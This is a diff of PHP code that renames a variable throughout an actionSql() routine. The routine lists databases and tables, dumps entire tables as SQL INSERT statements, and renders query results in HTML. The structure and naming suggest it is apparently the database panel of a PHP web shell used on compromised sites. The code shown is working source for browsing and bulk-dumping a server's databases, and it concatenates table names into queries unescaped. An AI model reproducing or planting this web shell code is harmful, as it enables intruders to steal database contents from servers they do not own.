@@ -1780,23 +1780,23 @@ function actionSql() {
                                         $this->query('SELECT * FROM `' . $table . '`');
                                         $i = 0;
                                         $head = true;
-                                        while ($▟ = $this->fetch()) {
+                                        while ($sqldatamysql = $this->fetch()) {
                                             $sql = '';
                                             if ($i % 1000 == 0) {
                                                 $head = true;
                                                 $sql = ";\n\n";
                                             }
                                             $columns = array();
-                                            foreach ($▟ as $k => $v) {
-                                                if ($v === null) $▟[$k] = "NULL";
-                                                elseif (is_int($v)) $▟[$k] = $v;
-                                                else $▟[$k] = "'" . @mysql_real_escape_string($v) . "'";
+                                            foreach ($sqldatamysql as $k => $v) {
+                                                if ($v === null) $sqldatamysql[$k] = "NULL";
+                                                elseif (is_int($v)) $sqldatamysql[$k] = $v;
+                                                else $sqldatamysql[$k] = "'" . @mysql_real_escape_string($v) . "'";
                                                 $columns[] = "`" . $k . "`";
                                             }
                                             if ($head) {
-                                                $sql.= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $▟) . ')';
+                                                $sql.= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $sqldatamysql) . ')';
                                                 $head = false;
-                                            } else $sql.= "\n\t,(" . implode(", ", $▟) . ')';
+                                            } else $sql.= "\n\t,(" . implode(", ", $sqldatamysql) . ')';
                                             if ($fp) fwrite($fp, $sql);
                                             else echo ($sql);
                                             $i++;
@@ -1806,13 +1806,13 @@ function actionSql() {
                                         break;
                                     case 'pgsql':
                                         $this->query('SELECT * FROM ' . $table);
-                                        while ($▟ = $this->fetch()) {
+                                        while ($sqldatamysql = $this->fetch()) {
                                             $columns = array();
-                                            foreach ($▟ as $k => $v) {
-                                                $▟[$k] = "'" . addslashes($v) . "'";
+                                            foreach ($sqldatamysql as $k => $v) {
+                                                $sqldatamysql[$k] = "'" . addslashes($v) . "'";
                                                 $columns[] = $k;
                                             }
-                                            $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $▟) . ');' . "\n";
+                                            $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $sqldatamysql) . ');' . "\n";
                                             if ($fp) fwrite($fp, $sql);
                                             else echo ($sql);
                                         }
@@ -1890,8 +1890,8 @@ function actionSql() {
                                     }
                                     $db->listDbs();
                                     echo "<label><select name=sql_base><option value=''></option>";
-                                    while ($▟ = $db->fetch()) {
-                                        list($key, $value) = each($▟);
+                                    while ($sqldatamysql = $db->fetch()) {
+                                        list($key, $value) = each($sqldatamysql);
                                         echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
                                     }
                                     echo '</select></label>';
@@ -1928,8 +1928,8 @@ function actionSql() {
                                     $db->selectdb($_POST['sql_base']);
                                     echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
                                     $tbls_res = $db->listTables();
-                                    while ($▟ = $db->fetch($tbls_res)) {
-                                        list($key, $value) = each($▟);
+                                    while ($sqldatamysql = $db->fetch($tbls_res)) {
+                                        list($key, $value) = each($sqldatamysql);
                                         if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
                                         $value = htmlspecialchars($value);
                                         echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
@@ -1956,18 +1956,18 @@ function actionSql() {
                                             $title = false;
                                             echo '<table width=100% cellspacing=1 cellpadding=2 class=main>';
                                             $line = 1;
-                                            while ($▟ = $db->fetch()) {
+                                            while ($sqldatamysql = $db->fetch()) {
                                                 if (!$title) {
                                                     echo '<tr>';
-                                                    foreach ($▟ as $key => $value) echo '<th>' . $key . '</th>';
-                                                    reset($▟);
+                                                    foreach ($sqldatamysql as $key => $value) echo '<th>' . $key . '</th>';
+                                                    reset($sqldatamysql);
                                                     $title = true;
                                                     echo '</tr><tr>';
                                                     $line = 2;
                                                 }
                                                 echo '<tr class="l' . $line . '">';
                                                 $line = $line == 1 ? 2 : 1;
-                                                foreach ($▟ as $key => $value) {
+                                                foreach ($sqldatamysql as $key => $value) {
                                                     if ($value == null) echo '<td><i>null</i></td>';
                                                     else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                                                 }
